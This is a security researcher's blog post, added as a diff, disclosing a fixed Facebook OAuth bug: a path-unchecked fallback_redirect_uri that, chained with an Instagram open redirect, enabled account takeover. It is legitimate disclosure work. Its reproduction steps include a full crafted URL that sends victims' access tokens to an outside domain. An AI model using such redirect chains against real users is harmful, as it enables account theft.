@@ -1,0 +1,116 @@
+---
+id: 646
+title: 'Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow'
+date: '2021-04-01T23:27:30+00:00'
+author: qw
+layout: post
+guid: 'https://ysamm.com/?p=646'
+wp_featherlight_disable:
+    - ''
+categories:
+    - Uncategorized
+---
+
+This bug could allow a malicious user to takeover Facebook or Instagram accounts due to missing URL path checking in fallback_redirect_uri parameter specified in the Facebook OAuth flow endpoints.
+
+**Details**
+
+In the domain [m.facebook.com](https://m.facebook.com/), the endpoint **https://m.facebook.com/dialog/oauth** which handles Facebook OAuth flow, has a preformatted response when the requesting to get an access_token/code via the postMessage return method to an opener window ( via xd_arbiter). The script in the response would try to make a postMessage to the target origin specified and checked in the redirect_uri as explained below:  
+  
+Let’s take the example of the OAuth flow for authorizing the Instagram application. The visited url would be something like this   
+**https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414**  
+**&amp;redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener**  
+**&amp;response_type=token,signed_request**  
+**&amp;scope=public_profile,email**  
+  
+Here the interesting part is the redirect_uri parameter. Instead of selecting the whitelisted redirect_uri for this application , we would select the infamous xd_arbiter endpoint which would allow us to receive the Facebook code/access_token via javascript method for cross-window communication, the postMessage method. Here the origin parameter in the fragment part of the staticxx.facebook.com url must contain a whitelisted website by the Facebook application or the request would fail. The same origin would be served in the response as the targetOrigin for the postMessage method.   
+  
+Although the user can’t get the access_token via an Eventlistener due to the reasons i previously pointed ( postMessage targetOrigin can’t be manipulated ), i found that there’s another way to get the access_token/code in case the postMessage method failed:  
+  
+We modify the previous URL to be like the following:  
+**https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414**  
+**&amp;redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener**  
+**&amp;response_type=token,signed_request**  
+**&amp;scope=public_profile,email**  
+**&amp;fallback_redirect_uri=https://www.instagram.com/**  
+  
+We would get a similar response as this one:
+
+```javascript
+var closeURI = "https:\/\/m.facebook.com\/dialog\/close_window\/?app_id=124024574287414&connect=1&redirect_domain=www.instagram.com";
+var fallbackRedirectURI = "https:\/\/www.instagram.com\/#SIGNED_REQUEST&access_token=ACCESS_TOKEN";
+var message = "origin=https\u00253A\u00252F\u00252Fwww.instagram.com\u00252F&relation=opener&signed_request=SIGNED_REQUEST&access_token=ACCESS_TOKEN&data_access_expiration_time=0&expires_in=0",
+    origin = "https:\/\/www.instagram.com",
+    domain = "www.instagram.com",
+    relation = "opener",
+    debugXD = false,
+    xrw = "";
+(function() {
+    var a = window.opener || window.parent,
+        b = navigator.userAgent,
+        c = !0;
+
+    function d(a, b) {
+        a = window.location.hostname.match(/\.(facebook\.sg|facebookcorewwwi\.(?:test)?onion)$/);
+        a = a ? a[1] : "facebook.com";
+        new Image().src = "https://m." + a + "/common/scribe_endpoint.php?c=jssdk_error&m=" + encodeURIComponent(JSON.stringify(b))
+    }
+
+    function e() {
+        var b = a === window;
+        try {
+            a != null && a !== window && (a === window.opener && relation === "opener.parent" && (a = window.opener.parent), a.postMessage(message, origin), window.close(), window.open("", "_self", ""), window.close()), window.closed || (fallbackRedirectURI ? window.location.replace(fallbackRedirectURI) : closeURI ? window.location.replace(closeURI) : d("jssdk_error", {
+                error: "DIALOG_CLOSE",
+                extra: {
+                    message: "Dialog did not close. refWasSelf: " + b
+                }
+            }))
+        } catch (a) {
+            c ? (c = !1, window.setTimeout(e, 200)) : d("jssdk_error", {
+                error: "POST_MESSAGE",
+                extra: {
+                    message: a.message + ", html/js/mobile/connect/XDDialogResponsePurePostMessage.js:43 refWasSelf: " + b
+                }
+            })
+        }
+    }
+
+    function f() {
+        __fbNative.postMessage(message, origin)
+    }
+    if (window == top && /FBAN\/\w+;/i.test(b) && !/FBAN\/mLite;/.test(b)) window.__fbNative && __fbNative.postMessage ? f() : window.addEventListener("fbNativeReady", f);
+    else {
+        f = /iPhone.*Version\/(5|6)/.test(b) ? RegExp.$1 === "5" ? 250 : 800 : 0;
+        f ? window.setTimeout(function() {
+            e()
+        }, f) : e()
+    }
+})();
+
+
+```
+
+  
+The same script would redirect to a selected URL in a parameter called **fallback_redirect_uri** in case the domain of the URL inside fallback_redirect_url is the same as a website whitelisted by the application and if other conditions are fulfilled. This would only occur if no opener window was found because **window.close** won’t work and **window.closed** would be false and in that case **window.location.replace(fallbackRedirectURI)** would be executed and a redirect would be made to the URL selected in fallback_redirect_uri with the Facebook access_token/code embedded in the fragment part of the URL.   
+The actual bug now is that the **fallback_redirect_uri** would only accept a whitelisted website set in the Facebook application configuration however no checks were done to the path part of URL like what is normally done to urls supplied in redirect_uri parameter in OAuth flows ( only domain part was checked ). The attacker could select any path to receive the token. We can chain this with another bug in the receiving website like an open redirect to leak the token to the attacker website ( since the fragment part of the URL is carried by the browser in redirects, the malicious website would receive it ).   
+I have achieved Facebook/Instagram account takeover by chaining this bug and a [previously reported open redirect in Instagram](https://ysamm.com/?p=625).  
+  
+**Reproduction Steps**
+
+The victim should visit this url or an attacker website which redirects to it:
+
+**https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414&amp;redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener&amp;response_type=token,signed_request&amp;scope=public_profile,email&amp;fallback_redirect_uri=https://www.instagram.com/accounts/convert_to_professional_account/?redirect_uri=https://ysamm.com**   
+This would redirect to **https://www.instagram.com/accounts/convert_to_professional_account/?redirect_uri=https://ysamm.com#access_token&amp;signed_request** and since this contained an open redirect it would redirect to **https://ysamm.com#access_token&amp;signed_request**.
+
+The access_token is a first-party token generated for the Instagram application and could be used to takeover the Facebook account. The signed_request contains a code that could be used too to access the victim’s Instagram account.  
+  
+**Timeline**   
+  
+Feb 7, 2021— Report Sent   
+Feb 8, 2021— Acknowledged by Facebook  
+Feb 18, 2021— Fixed by Facebook  
+Feb 26, 2021 — $30K (including bonus) bounty awarded by Facebook.  
+Feb 26, 2021 – A bypass was sent to the team which allowed this to work despite the fix in mobile devices.  
+Mar 5, 2021— Acknowledged by Facebook  
+Mar 17, 2021— Fixed by Facebook  
+Mar 22, 2021 — $12K (including bonus) bounty awarded by Facebook.
